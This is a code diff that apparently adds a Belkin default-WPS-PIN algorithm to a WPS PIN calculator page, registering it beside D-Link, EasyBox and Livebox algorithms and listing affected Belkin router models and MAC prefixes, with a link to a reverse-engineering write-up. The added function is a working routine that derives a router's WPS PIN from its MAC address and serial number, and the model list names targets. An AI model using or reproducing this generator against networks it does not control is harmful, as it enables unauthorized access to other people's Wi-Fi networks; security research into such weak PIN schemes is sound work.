@@ -223,6 +223,35 @@ function algoDLink(mac)
 	if (mac < 1000000) mac += ((mac % 9) * 1000000) + 1000000;
 	return mac;
 }
+function algoBelkin(mac, ser)
+{
+	if (ser == null)
+		ser = '';
+	if (ser.length < 4)
+		ser = zeroFill(ser, 4);
+	if (ser.length > 4)
+		ser = ser.substr(-4);
+	var sn = [];
+	for (var i = 0; i < ser.length; i++)
+	{
+		x = parseInt(ser[i]);
+		if (isNaN(x)) x = 0;
+		sn.push(x);
+	}
+	var nic = [(mac & 0xFFFF) >> 12, (mac & 0xFFF) >> 8, (mac & 0xFF) >> 4, mac & 0xF];
+
+	var k1 = (sn[0] + sn[1] + nic[2] + nic[3]) & 0xF;
+	var k2 = (sn[2] + sn[3] + nic[0] + nic[1]) & 0xF;
+
+	var pin =    ( k2 ^ sn[2]                  )  << 4;
+	pin = (pin + ( k1 ^ sn[3]                  )) << 4;
+	pin = (pin + ( k1 ^ nic[3] ^ sn[2] ^ sn[3] )) << 4;
+	pin = (pin + ( k2 ^ nic[2]                 )) << 4;
+	pin = (pin + ( nic[2] ^ nic[3]             )) << 4;
+	pin = (pin + ( k1 ^ k2                     )) << 4;
+	pin =  pin + ( k1 ^ k2 ^ sn[1] ^ nic[1]    );
+	return pin % 10000000;
+}
 function algoEasyBox(mac, ser)
 {
 	if (ser == null)
@@ -336,6 +365,7 @@ function initpage()
 	{
 		return algoDLink(mac + 1);
 	}});
+	algos.push({id: "pinBelkin", name: "Belkin PIN", mode: ALGO_MACSN, func: algoBelkin});
 	algos.push({id: "pinEasyBox", name: "Vodafone EasyBox", mode: ALGO_MACSN, func: algoEasyBox});
 	algos.push({id: "pinLivebox", name: "Livebox Arcadyan", mode: ALGO_MACSN, func: function (mac, ser)
 	{
@@ -819,6 +849,42 @@ TRENDnet TEW-673GRU
 
 %l10n_wpspin_tech%
 http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/</textarea>
+
+<textarea id=pinBelkin>Belkin F5D7234-4 v3
+Belkin F5D7234-4 v4
+Belkin F5D7234-4 v5
+Belkin F5D8233-4 v1
+Belkin F5D8233-4 v3
+Belkin F5D9231-4 v1
+Belkin F6D4230-4 v2
+Belkin F6D4230-4 v3
+Belkin F7D1301 v1
+Belkin F7D2301 v1
+Belkin F7D4401 v1
+Belkin F9J1102 v2
+Belkin F9J1105 v1
+Belkin F9K1001 v4
+Belkin F9K1001 v5
+Belkin F9K1002 v1
+Belkin F9K1002 v2
+Belkin F9K1002 v5
+Belkin F9K1102 v3
+Belkin F9K1102 v5
+Belkin F9K1103 v1
+Belkin F9K1105 v1
+Belkin F9K1105 v3
+Belkin F9K1105 v5
+Belkin F9K1112 v1
+Belkin F9K1113 v1
+Belkin F9K1118 v2
+  08:86:3B:xx:xx:xx
+  94:10:3E:xx:xx:xx
+  B4:75:0E:xx:xx:xx
+  C0:56:27:xx:xx:xx
+  EC:1A:59:xx:xx:xx
+
+%l10n_wpspin_tech%
+http://www.devttys0.com/2015/04/reversing-belkins-wps-pin-algorithm/</textarea>
 
 <textarea id=pinEasyBox>Vodafone EasyBox 802
 Vodafone EasyBox 803
